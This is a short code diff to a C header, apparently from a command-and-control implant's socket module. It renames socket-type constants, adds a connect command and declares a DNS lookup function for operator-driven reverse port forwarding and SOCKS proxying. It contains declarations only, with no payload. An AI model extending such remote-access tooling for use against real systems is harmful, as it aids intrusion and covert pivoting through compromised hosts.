@@ -4,8 +4,8 @@
 #define SOCKET_TYPE_REVERSE_PORTFWD      0x1
 #define SOCKET_TYPE_REVERSE_PROXY        0x2 /* TODO: implement */
 #define SOCKET_TYPE_CLIENT               0x3
-#define SOCKET_TYPE_REMOVED              0x4 /* this is something we received from our operator */
-#define SOCKET_TYPE_DEAD                 0x5 /* this is when a socket died, or we failed to read/write from/to it */
+#define SOCKET_TYPE_CLIENT_REMOVED       0x4 /* this is something we received from our operator */
+#define SOCKET_TYPE_SOCKS_REMOVED        0x5 /* this is when a socket died, or we failed to read/write from/to it */
 
 #define SOCKET_COMMAND_RPORTFWD_ADD      0x0
 #define SOCKET_COMMAND_RPORTFWD_ADDLCL   0x1
@@ -21,6 +21,7 @@
 #define SOCKET_COMMAND_OPEN         0x10
 #define SOCKET_COMMAND_READ_WRITE   0x11
 #define SOCKET_COMMAND_CLOSE        0x12
+#define SOCKET_COMMAND_CONNECT      0x13
 
 /* Errors */
 #define SOCKET_ERROR_ALREADY_BOUND  0x1
@@ -61,3 +62,10 @@ PSOCKET_DATA SocketNew( SOCKET Socket, DWORD Type, DWORD LclAddr, DWORD LclPort,
 
 /* Check for new connections, read everything from the sockets and or close "dead" sockets */
 VOID SocketPush();
+
+/*!
+ * Query the IP from the specified domain
+ * @param Domain
+ * @return Ip address
+ */
+DWORD DnsQueryIP( LPSTR Domain );
